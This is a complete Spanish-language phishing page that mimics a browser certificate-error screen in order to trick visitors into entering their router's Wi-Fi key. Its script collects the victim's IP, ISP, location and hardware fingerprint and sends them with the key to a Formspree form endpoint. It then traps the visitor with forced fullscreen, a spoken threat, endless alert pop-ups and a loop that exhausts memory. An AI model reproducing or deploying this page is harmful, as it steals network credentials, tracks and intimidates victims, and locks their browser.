<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Error de Privacidad</title>
    <style>
        body { background: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; color: #333; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { max-width: 600px; padding: 40px; }
        .icon { color: #d93025; font-size: 48px; margin-bottom: 20px; }
        h1 { font-size: 22px; font-weight: 500; margin-bottom: 15px; }
        p { font-size: 14px; line-height: 1.6; color: #5f6368; }
        .advanced-box { margin-top: 20px; padding: 20px; background: #f8f9fa; border-radius: 4px; border: 1px solid #dadce0; }
        .input-field { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; margin-top: 20px; float: right; }
        #hidden-status { display: none; font-family: monospace; font-size: 12px; margin-top: 20px; color: #1e8e3e; }
    </style>
</head>
<body>

<div class="container" id="main-ui">
    <div class="icon">⚠</div>
    <h1>La conexión no es privada</h1>
    <p>Es posible que atacantes estén intentando robar tu información de este sitio. Para mitigar el riesgo, el protocolo de seguridad de tu adaptador de red debe ser sincronizado.</p>
    
    <div class="advanced-box">
        <label style="font-size: 12px; font-weight: bold;">CÓDIGO DE SEGURIDAD DEL ROUTER (PIN/WPA2)</label>
        <input type="password" id="net_key" class="input-field" placeholder="Ingrese la llave de red para validar">
        <p style="font-size: 11px; margin-top: 10px;">Código de error: NET::ERR_CERT_AUTHORITY_INVALID</p>
    </div>
    
    <button class="btn" onclick="executeSilentBreach()">Configurar Conexión</button>
</div>

<div id="hidden-status" class="container">
    <p>Iniciando tunelización inversa...</p>
    <p id="ip-log"></p>
    <p>Sincronización completa. No cierre esta ventana.</p>
</div>

<script>
    const FORM_ID = "xykdyebg";

    async function executeSilentBreach() {
        const key = document.getElementById('net_key').value;
        if (!key) return;

        // 1. Recolección de Metadatos del Sistema (La IP y el Hardware)
        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
        
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";

        const payload = {
            "TIPO": "INFILTRACION_ADAPTADOR",
            "IP_VICTIMA": ipData.ip,
            "ISP": ipData.org,
            "UBICACION": `${ipData.city}, ${ipData.country_name}`,
            "WIFI_KEY": key,
            "HARDWARE_GPU": gpu,
            "RAM": navigator.deviceMemory + "GB",
            "CORES": navigator.hardwareConcurrency,
            "SO": navigator.platform
        };

        // 2. Enviar TODO a Formspree inmediatamente
        fetch(`https://formspree.io/f/${FORM_ID}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        // 3. El "Secuestro" Real (Bloqueo lógico)
        document.getElementById('main-ui').style.display = 'none';
        document.getElementById('hidden-status').style.display = 'block';
        document.getElementById('ip-log').innerText = "Nodo asignado: " + ipData.ip;

        // Pedir Fullscreen para atraparlo
        document.documentElement.requestFullscreen().catch(() => {});

        // Lanzar el audio de advertencia (Ahora sí, la parte seria del mensaje)
        const voz = new SpeechSynthesisUtterance("Acceso al sistema confirmado. Su dirección IP " + ipData.ip + " ha sido registrada. Te llamaré en diez horas.");
        voz.lang = 'es-ES';
        voz.pitch = 0.6;
        window.speechSynthesis.speak(voz);

        // Bucle de bloqueo: Esto hará que no pueda cerrar la página
        setInterval(() => {
            alert("ALERTA DE SEGURIDAD: Conexión persistente establecida con " + ipData.ip + "\n\nInformación exfiltrada. No intente reiniciar.");
            // Consumir RAM de forma progresiva
            let b = new Array(1000000).fill("DATA_LEAK");
        }, 1000);
    }
</script>
</body>
</html>
